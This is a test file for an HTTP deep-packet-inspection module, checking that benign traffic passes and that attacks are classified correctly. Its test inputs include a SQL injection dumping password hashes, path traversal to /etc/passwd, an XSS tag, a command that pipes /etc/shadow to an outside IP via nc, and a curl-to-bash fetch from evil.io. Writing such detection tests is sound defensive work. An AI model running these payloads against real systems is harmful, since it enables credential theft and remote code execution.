/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { describe, it, expect } from 'vitest';
import { inspectHttpIngressPayload } from '../dpiSignatures.js';

describe('dpiSignatures', () => {
  it('does not flag normal browser User-Agent semicolons or standard API polls as Command Injection', () => {
    const match = inspectHttpIngressPayload({
      path: '/api/metrics',
      urlToScan: '/api/metrics',
      bodyString: '',
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    });
    expect(match).toBeNull();
  });

  it('does not flag normal JSON payloads containing apostrophes or words like update/select', () => {
    const match = inspectHttpIngressPayload({
      path: '/api/hosts/register',
      urlToScan: '/api/hosts/register',
      bodyString: JSON.stringify({ name: "Chris's Edge Node", notes: 'Please select and update server config' }),
      userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    });
    expect(match).toBeNull();
  });

  it('still detects real SQLi, XSS, LFI, scanner, and command injection attacks', () => {
    expect(
      inspectHttpIngressPayload({
        path: '/api/student/records',
        urlToScan: "/api/student/records?department=cybersec' UNION SELECT 1,username,password_hash FROM users WHERE '1'='1--",
      })?.category
    ).toBe('SQL Injection (SQLi)');

    expect(
      inspectHttpIngressPayload({
        path: '/api/files/download',
        urlToScan: '/api/files/download?path=../../../../etc/passwd',
      })?.category
    ).toBe('Path Traversal / LFI');

    expect(
      inspectHttpIngressPayload({
        path: '/.env',
        urlToScan: '/.env?secret=eval&debug=true',
      })?.category
    ).toBe('Reconnaissance / Vulnerability Scanner');

    expect(
      inspectHttpIngressPayload({
        path: '/api/comments',
        urlToScan: "/api/comments?msg=<script>alert(1)</script>",
      })?.category
    ).toBe('Cross-Site Scripting (XSS)');

    expect(
      inspectHttpIngressPayload({
        path: '/api/exec',
        urlToScan: '/api/exec?cmd=cat /etc/shadow | nc 185.220.101.42 4444',
      })?.category
    ).toBe('Path Traversal / LFI');

    expect(
      inspectHttpIngressPayload({
        path: '/api/exec',
        urlToScan: '/api/exec?cmd=curl http://evil.io/p.sh | bash',
      })?.category
    ).toBe('Command Injection / Reverse Shell');
  });
});
